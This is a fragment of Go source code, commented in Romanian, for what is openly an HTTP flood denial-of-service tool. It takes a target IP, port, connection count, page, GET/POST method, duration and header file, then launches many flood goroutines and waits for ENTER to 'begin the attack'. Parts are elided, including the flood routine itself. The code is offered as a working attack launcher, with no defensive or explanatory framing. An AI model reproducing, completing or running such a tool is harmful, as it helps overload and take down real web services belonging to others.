...
func main() {
	...
	if len(os.Args) != 8 {
		fmt.Println("")
		fmt.Println("Comanda: ", os.Args[0], "<ip> <port> <conexiuni> <pagina> <get/post> <timp(secunde)> <header.txt/nil>")
		os.Exit(1)
	}
	...
	for i := 1; i <= threads; i++ {
		...
		go flood() // incep conexiunile
		fmt.Printf("\r[%.0f] conexiuni sunt gata", float64(i))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Printf("\nApasa [ENTER] pentru a incepe atacul")
	_, err := input.ReadString('\n')
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println("Atacul se va incheia in atatea " + os.Args[6] + " secunde.")
	close(start)
